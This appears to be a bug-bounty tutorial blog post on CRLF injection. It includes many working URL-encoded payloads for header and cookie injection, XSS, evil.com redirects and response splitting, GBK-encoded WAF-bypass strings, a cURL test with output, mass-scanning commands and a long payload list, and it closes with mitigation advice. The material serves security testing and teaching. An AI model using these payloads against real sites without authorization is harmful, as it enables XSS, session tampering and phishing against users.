Master CRLF Injection: The Underrated Bug with Dangerous Potential
Learn how attackers exploit CRLF Injection to manipulate HTTP responses, hijack headers and unlock hidden vulnerabilities in modern web applications
coffinxp
coffinxp

Following
9 min read
·
May 12, 2025
228


2






Introduction
In web security some vulnerabilities don’t get as much attention but can still cause major problems. One of these is CRLF Injection. Although it’s not as well-known as SQL Injection or Cross-Site Scripting, CRLF Injection can lead to serious issues like HTTP response splitting, web cache poisoning and even XSS attacks all of which can put a website at risk

What is CRLF Injection?
CRLF stands for Carriage Return (CR, %0d) and Line Feed (LF, %0a), which are special characters used to denote the end of a line in HTTP headers. CRLF Injection occurs when an attacker is able to inject these characters into HTTP headers or responses, manipulating how the server or client interprets the response.

By injecting CRLF sequences, an attacker can prematurely terminate headers and inject arbitrary headers or even body content leading to various attacks such as:

HTTP Response Splitting
Web Cache Poisoning
Cross-Site Scripting (XSS)
Session Fixation
How Does CRLF Injection Work?
CRLF Injection relies on the ability to inject a newline character (%0d%0a in URL encoding) into HTTP headers. When these characters are inserted at the wrong place in the response they can break the header structure allowing attackers to introduce custom headers or even manipulate the content of the response.

For example in a web application that doesn’t properly sanitize user input, an attacker could inject the following payload into a field that is reflected in the HTTP response headers:

%0d%0aX-Injection-Test: injected
This payload adds a new header (X-Injection-Test: injected) to the HTTP response.

Real-World Payload Examples
Basic Header Injection
One of the simplest forms of CRLF Injection is when attackers add custom headers. This is done by injecting the %0d%0a sequence:

%0d%0aX-Injection-Test: injected
This can lead to unauthorized header manipulation or potentially bypass access controls or caching mechanisms.

Cookie Injection
CRLF Injection can be used to inject new cookies into the HTTP response. This is particularly dangerous when session data or other sensitive information is being managed via cookies

%0d%0aSet-Cookie: hacked=true;
This payload injects a new cookie (hacked=true) into the response, which could lead to session hijacking or other attacks if exploited in a vulnerable web app.

HTML Injection
One of the more insidious uses of CRLF Injection is to inject HTML or JavaScript into an HTTP response, which can trigger cross-site scripting (XSS) or unwanted redirects. For example:

%0d%0a%3Ch1%3ECoffinxp%3C%2Fh1%3E%0A%3Cp%3ECRLF%20Injection%20PoC%3C%2Fh1%3E
Decoded html version:

<h1>Coffinxp</h1>
<p>CRLF Injection PoC</p>
This injects an HTML header (<h1>Coffinxp</h1>) and a paragraph (<p>CRLF Injection PoC</p>), potentially altering the page’s content in unexpected ways.

Redirection/phishing
CRLF Injection can be used to inject links that redirect users to phishing sites:

%0d%0a%0d%0a%3CA%20HREF%3D%22https%3A%2F%2Fexample.com%2F%22%3ELogin%20Here%20%3C%2FA%3E%0A%0A
Decoded html version:

<A HREF="https://example.com/">Login Here </A>
This injects a hidden link that could be used to trick users into clicking on a fake site login page. which could be used in social engineering or phishing attacks.

Injecting Dangerous HTML Elements
A common and dangerous use of CRLF Injection is to inject JavaScript code that executes in the victim’s browser leading to XSS attacks. For example an attacker can inject HTML elements with event handlers that trigger JavaScript execution.

%0d%0a%0d%0a%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E
Decoded html version:

<img src=x onerror=prompt(1)>
In this case the attacker uses an image with a broken src to trigger a JavaScript error which can execute arbitrary JavaScript code. which can be used to steal cookies, hijack sessions or perform other malicious actions.

Open Redirect
CRLF Injection can also be used to perform open redirect attacks by injecting a new Location header into the HTTP response. When successful this forces the browser to redirect the user to a malicious site which is often used in phishing campaigns.

%0d%0aLocation:%20https://evil.com
By injecting a new Location header using CRLF (%0d%0a), the server may interpret it as a legitimate redirect command. If the application does not sanitize user input properly, the browser will redirect the user to https://evil.com.

XSS Injection
Another common use of CRLF Injection is to insert JavaScript into an HTTP response, which can lead to Cross-Site Scripting (XSS). This allows attackers to run malicious scripts in the victim’s browser.

%0d%0a%0d%0a<script>alert('XSS via CRLF')</script>
This payload breaks the response and injects a <script> tag, causing the browser to execute the JavaScript code and display an alert.

Redirecting with JavaScript Injection
%0d%0a%0d%0a%3Cscript%3Edocument.location.href%3D%22https%3A%2F%2Fevil.com%22%3C%2Fscript%3E
Decoded version:

<script>document.location.href="https://evil.com"</script>
This injects a script that redirects the victim to a malicious site (evil.com), which could be used for phishing or malware distribution.

XSS Protection Bypass
A more advanced use of CRLF Injection involves disabling browser-based XSS protections by injecting custom HTTP headers. Attackers can insert the X-XSS-Protection: 0 header, which tells the browser to ignore built-in protections against reflected XSS.


%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
Decoded version:

?
Location:
Content-Type:text/html
X-XSS-Protection:0

<script>alert(document.cookie)</script>
Injects new headers (including disabling X-XSS-Protection)
Breaks the HTTP response
Inserts malicious JavaScript into the body, leading to a potential XSS attack
In this payload, the attacker disables XSS protection and injects a <script> tag that executes alert(document.cookie). This can lead to session hijacking, data theft or other malicious browser-side actions.

IFrame injection
Similarly, the attacker could inject a hidden iframe to redirect users to a malicious site:

%0d%0a%0d%0a%3Ciframe%20src%3D%22https%3A%2F%2Fwww.nasa.gov%2F%22%20style%3D%22border%3A%200%3B%20position%3Afixed%3B%20top%3A0%3B%20left%3A0%3B%20right%3A0%3B%20bottom%3A0%3B%20width%3A100%25%3B%20height%3A100%25%22%3E%0A
Decoded version:

<iframe src="https://www.nasa.gov/" style="border: 0; position:fixed; top:0; left:0; right:0; bottom:0; width:100%; height:100%">
This payload creates a full-page embedded iframe that loads the NASA website and overlays it completely over the current page, which can be used for clickjacking or phishing attacks.

HTTP Response Splitting
HTTP Response Splitting is a powerful technique made possible by CRLF Injection. By injecting %0d%0a (Carriage Return + Line Feed), an attacker can split the server’s HTTP response into two parts. This enables manipulation of headers and body content in unexpected ways.

/vulnerable-endpoint?q=abc%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert('Split!')</script>
%0d%0a → Ends the current header line
Content-Length: 0 → Ends original response
A new HTTP/1.1 200 OK response starts with a malicious script in the body
The browser or cache may treat the second part as a new valid response
Bypass Technique (GBK Encoding Payload)
When basic CRLF payloads like the following get blocked by WAF:

/%0D%0ASet-Cookie:whoami=coffinxp
You can bypass the firewall using GBK-encoded characters that act like CR and LF. In GBK encoding:

嘍 = %E5%98%8D (interpreted as CR)
嘊 = %E5%98%8A (interpreted as LF)
Bypass Payload:

https://example.com/%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=coffinxp
This payload bypasses standard filtering and successfully injects a custom header like:

Set-Cookie: crlfinjection=coffinxp
XSS Chaining (GBK-encoded <script>)

To escalate CRLF to XSS:

< = 嘼 = %E5%98%BC
> = 嘾 = %E5%98%BE
Full Payload for CRLF → XSS (encoded):

https://example.com/%E5%98%8D%E5%98%8ASet-Cookie:whoami=coffinxp%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE
This forces the server to break response headers and inject executable JS into the response body

Bypassing character blocklists with unicode overflows
Unicode codepoint truncation - also called a Unicode overflow attack - happens when a server tries to store a Unicode…
portswigger.net

How to Hunt
Now let me show you a very simple and effective way to hunt for CRLF injection vulnerabilities.

using cURL
One of the easiest ways to test for CRLF Injection is by using the command-line tool cURL. It allows you to send custom requests and observe how the server handles special characters.

curl -I "https://example.com/%0d%0aSet-Cookie:crlf=injected;
╭─[coffinxp@Lostsec]─[~]                                                                  (WSL at )─[ 96%]─[12,15:46]
╰─ curl -I "https://example.com/%0d%0aSet-Cookie:crlf=injected;"
HTTP/2 301
date: Mon, 12 May 2025 12:46:42 GMT
content-type: text/html
location: https://example.com/
set-cookie: crlf=injected;
In this request:

%0d%0a represents a CRLF sequence (Carriage Return + Line Feed).
Injected-Header: test is the custom header we’re trying to inject
Automate with Nuclei
You can also use my custom Nuclei template to easily detect CRLF injection vulnerabilities at scale across multiple target domains.

Scan a single URL:

nuclei -u https://target.com -t cRlf.yaml
Scan a list of subdomains:

subfinder -d domain.com -all | nuclei -t cRlf.yaml

nuclei-templates/cRlf.yaml at main · coffinxp/nuclei-templates
Contribute to coffinxp/nuclei-templates development by creating an account on GitHub.
github.com

using Loxs tool
You can also use our Loxs tool to perform mass scanning for CRLF injection vulnerabilities across multiple targets quickly and efficiently.


GitHub - coffinxp/loxs: best tool for finding SQLi,CRLF,XSS,LFi,OpenRedirect
best tool for finding SQLi,CRLF,XSS,LFi,OpenRedirect - coffinxp/loxs
github.com

my nuclei template vs crlfuzz tool
You’ll notice the difference my Nuclei template detects more vulnerable domains compared to the Crlfuzz tool, making it more effective for large-scale CRLF injection hunting.


Using Burp Suite
Burp Suite makes it easy to detect CRLF Injection by observing how the server responds to special newline characters in request parameters.

Steps:
Intercept a request using Burp (e.g., a GET request with a query parameter like ?page=home).
Send the request to Repeater.
Modify a parameter by injecting CRLF sequences like:
home%0d%0aSet-Cookie:injected=1
4. Observe the response:

Look for new headers in the response (e.g., a fake Set-Cookie, X-Test, etc.).
Check if the layout or page breaks, which may indicate header or body manipulation.
Example:

Original URL:

https://target.com/page=home
Tested with CRLF:

https://target.com/page=home%0d%0aSet-Cookie:crlf=1
If you see Set-Cookie: crlf=1 in the response headers, the site is vulnerable.

Advance Tips

Payloads
/%%0a0aSet-Cookie:coffin=hi
/%0aSet-Cookie:coffin=hi;
/%0aSet-Cookie:coffin=hi
/%0d%0aLocation: http://evil.com
/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
/%0d%0a%0d%0a<script>alert('XSS')</script>;
/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e
/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('XSS');</script>
/%0d%0aHost: {{Hostname}}%0d%0aCookie: coffin=hi%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: coffin=hi%0d%0a%0d%0a
/%0d%0aLocation: www.evil.com
/%0d%0aSet-Cookie:coffin=hi;
/%0aSet-Cookie:coffin=hi
/%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<svg/onload=alert(document.domain)>
/%23%0aSet-Cookie:coffin=hi
/%25%30%61Set-Cookie:coffin=hi
/%2e%2e%2f%0d%0aSet-Cookie:coffin=hi
/%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a<script>alert(document.cookie)</script>%2F../%2F..%2F..%2F..%2F../tr
/%3f%0d%0aLocation:%0d%0acoffin-x:coffin-x%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(document.domain)</script>
/%5Cr%20Set-Cookie:coffin=hi;
/%5Cr%5Cn%20Set-Cookie:coffin=hi;
/%5Cr%5Cn%5CtSet-Cookie:coffin%5Cr%5CtSet-Cookie:coffin=hi;
/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:coffin=hi;
/%E5%98%8A%E5%98%8DLocation:www.evil.com
/%E5%98%8D%E5%98%8ALocation:www.evil.com
/%E5%98%8D%E5%98%8ASet-Cookie:coffin=hi
/%E5%98%8D%E5%98%8ASet-Cookie:coffin=hi;
/%E5%98%8D%E5%98%8ASet-Cookie:coffinxp=coffinxp
/%u000ASet-Cookie:coffin=hi;
/www.evil.com/%2E%2E%2F%0D%0Acoffin-x:coffin-x
/www.evil.com/%2F..%0D%0Acoffin-x:coffin-x
Resources:
CRLF (%0D%0A) Injection
Reading time: 11 minutes Carriage Return (CR) and Line Feed (LF), collectively known as CRLF, are special character…
book.hacktricks.wiki

Making HTTP header injection critical via response queue poisoning
HTTP header injection is often under-estimated and misclassified as a moderate severity flaw equivalent to XSS or…
portswigger.net

Mitigating CRLF Injection
To prevent CRLF Injection attacks, developers should:

Sanitize and Validate Input: Ensure that any user input that can be reflected in HTTP headers is properly sanitized. This includes stripping out \r (Carriage Return) and \n (Line Feed) characters.
Use Safe Functions for Header Manipulation: Avoid manually constructing headers. Use secure and well-tested libraries to handle HTTP header construction to prevent accidental injection.
Output Encoding: Encode special characters in user input, especially when displaying data in HTTP headers to prevent the insertion of malicious content
Conclusion
CRLF Injection is a hidden yet powerful vulnerability that can lead to serious issues like XSS, header injection and HTTP response splitting. By understanding how CR and LF characters are interpreted by servers and testing with crafted payloads, you can uncover and fix these flaws to keep your web applications secure

Upnext: If you found this helpful, you’ll definitely want to check out my article Mastering Rate Limit Bypass Techniques. It’s a practical guide to evading rate limits using real-world tricks, headers and automation methods 👇

Mastering Rate Limit Bypass Techniques
Learn How Hackers Bypass Rate Limits — and How You Can Too
infosecwriteups.com

Disclaimer
The content provided in this article is for educational and informational purposes only. Always ensure you have proper authorization before conducting security assessments. Use this information responsibly
